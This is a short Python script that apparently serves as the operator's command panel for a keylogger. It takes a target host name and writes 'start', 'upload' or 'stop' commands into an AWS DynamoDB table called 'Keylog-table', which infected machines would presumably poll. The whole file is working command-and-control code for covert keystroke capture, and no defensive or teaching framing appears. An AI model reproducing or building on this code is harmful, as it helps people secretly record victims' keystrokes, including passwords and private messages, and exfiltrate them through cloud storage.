import boto3
from dotenv import load_dotenv


def main():

    load_dotenv()
    
    host_name = input("Host name is case and whitespace sensitive\nHost name: ")

    while True:
        cmd = input("Enter cmd: Start | Upload | Stop = ").strip().lower()
        
        if cmd == "start":
            update_cmd(host_name, cmd)
        elif cmd == "upload":
            update_cmd(host_name, cmd)
        elif cmd == "stop":
            update_cmd(host_name, cmd)
        else:
            break

def update_cmd(host_name, cmd):
    dynamodb = boto3.client('dynamodb',
    region_name='ap-southeast-2')
    dynamodb.update_item(
        TableName='Keylog-table',
        Key={'hostName': {'S': host_name}},
        UpdateExpression='SET curr_cmd = :cmd',
        ExpressionAttributeValues={':cmd': {'S': cmd}}
)
    
if __name__ == "__main__":
    main()